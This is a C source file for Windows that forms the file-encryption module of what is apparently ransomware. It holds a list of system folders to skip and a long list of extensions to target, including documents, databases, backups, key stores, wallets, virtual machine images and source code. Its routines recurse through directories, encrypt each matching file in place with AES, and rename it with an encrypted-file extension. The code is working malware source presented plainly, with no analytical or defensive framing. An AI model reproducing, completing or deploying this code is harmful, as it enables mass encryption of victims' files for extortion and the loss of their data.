#include "fileops.h"
#include "crypto.h"
#include <stdio.h>
#include <string.h>
#include <shlobj.h>

/* ── Stuff we skip (system dirs) ── */
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    NULL
};

/* ── Extensions we encrypt ── */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn",
    NULL
};

int ShouldSkipPath(const char *fullPath) {
    for (int i = 0; g_skip[i]; i++) {
        if (strstr(fullPath, g_skip[i])) return 1;
    }
    return 0;
}

int IsTargetExtension(const char *path) {
    const char *ext = strrchr(path, '.');
    if (!ext) return 0;

    /* Skip if already encrypted */
    size_t plen = strlen(path);
    if (plen > ENC_EXT_LEN &&
        _stricmp(path + plen - ENC_EXT_LEN, ENC_EXT) == 0)
        return 0;

    for (int i = 0; g_ext[i]; i++) {
        if (_stricmp(ext, g_ext[i]) == 0) return 1;
    }
    return 0;
}

void EncryptSingleFile(const char *path) {
    HANDLE hFile  = INVALID_HANDLE_VALUE;
    BYTE  *buf    = NULL;
    DWORD  bufSize = 0;

    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fs = GetFileSize(hFile, NULL);
    if (fs == INVALID_FILE_SIZE || fs < 1) goto cleanup;

    bufSize = AES_IV_SIZE + fs + AES_PAD_HEADROOM;
    buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) goto cleanup;

    DWORD rd = 0;
    if (!ReadFile(hFile, buf + AES_IV_SIZE, fs, &rd, NULL) || rd != fs)
        goto cleanup;

    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    /* Generate random IV */
    BYTE iv[AES_IV_SIZE];
    CRYPTO_CTX *ctx = GetCryptoCtx();
    if (!CryptGenRandom(ctx->hProv, AES_IV_SIZE, iv)) goto cleanup;

    /* Encrypt */
    DWORD encLen = rd;
    if (!EncryptBuffer(ctx, iv, buf + AES_IV_SIZE, &encLen,
                       fs + AES_PAD_HEADROOM))
        goto cleanup;

    /* Prepend IV */
    memcpy(buf, iv, AES_IV_SIZE);

    /* Atomic write via temp file */
    char tmpPath[MAX_FPATH];
    snprintf(tmpPath, sizeof(tmpPath) - 1, "%s.tmp", path);

    HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;

    DWORD wr = 0;
    DWORD totalOut = AES_IV_SIZE + encLen;
    if (!WriteFile(hWrite, buf, totalOut, &wr, NULL) || wr != totalOut) {
        CloseHandle(hWrite);
        DeleteFileA(tmpPath);
        goto cleanup;
    }
    CloseHandle(hWrite);

    if (!MoveFileExA(tmpPath, path, MOVEFILE_REPLACE_EXISTING))
        DeleteFileA(tmpPath);

cleanup:
    if (buf) {
        SecureZeroMemory(buf, bufSize);
        VirtualFree(buf, 0, MEM_RELEASE);
    }
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
}

void EncryptDirectory(const char *dir, int depth) {
    if (depth > MAX_DEPTH)   return;
    if (ShouldSkipPath(dir)) return;

    char pattern[MAX_FPATH];
    snprintf(pattern, sizeof(pattern) - 1, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;

        char full[MAX_FPATH];
        int written = snprintf(full, sizeof(full) - 1,
                               "%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(sizeof(full) - 1))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDirectory(full, depth + 1);
        } else {
            if (!IsTargetExtension(full)) continue;

            /* Guard: skip if .encrypted counterpart already exists */
            char encPath[MAX_FPATH];
            snprintf(encPath, sizeof(encPath) - 1, "%s%s", full, ENC_EXT);
            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                continue;

            EncryptSingleFile(full);
            MoveFileExA(full, encPath, MOVEFILE_REPLACE_EXISTING);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}